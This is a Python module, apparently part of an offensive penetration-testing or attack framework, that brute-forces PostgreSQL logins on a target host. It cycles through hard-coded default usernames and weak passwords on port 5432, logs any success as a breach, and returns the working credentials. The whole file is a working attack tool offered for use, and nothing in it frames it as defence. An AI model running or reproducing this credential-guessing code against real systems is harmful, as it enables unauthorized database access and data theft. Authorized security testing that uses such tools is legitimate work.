
import asyncio
import asyncpg
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class PostgresBruteforceModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {
            "attack": "postgres_bruteforce",
            "success": False,
            "risk": 8
        }

        host = options['context']['target'].split('/')[2].split(':')[0]
        port = 5432

        users = ["postgres", "admin", "user", "root"]
        passwords = ["", "password", "123456", "postgres", "admin"]

        self.logger.info(f"POSTGRES BRUTEFORCE → {host}:{port}")

        for user in users:
            for pwd in passwords:
                try:
                    conn = await asyncio.wait_for(
                        asyncpg.connect(
                            host=host,
                            port=port,
                            user=user,
                            password=pwd,
                            timeout=3
                        ),
                        timeout=5
                    )
                    result.update({
                        "success": True,
                        "vulnerable_payload": f"{user}:{pwd}",
                        "data_leaked": {"user": user, "password": pwd}
                    })
                    self.logger.breach(f"POSTGRES: {user}:{pwd}")
                    if self.brain:
                        self.brain.learn("postgres_bruteforce", target, f"{user}:{pwd}", True)
                    await conn.close()
                    return result
                except Exception as e:
                    continue

        return result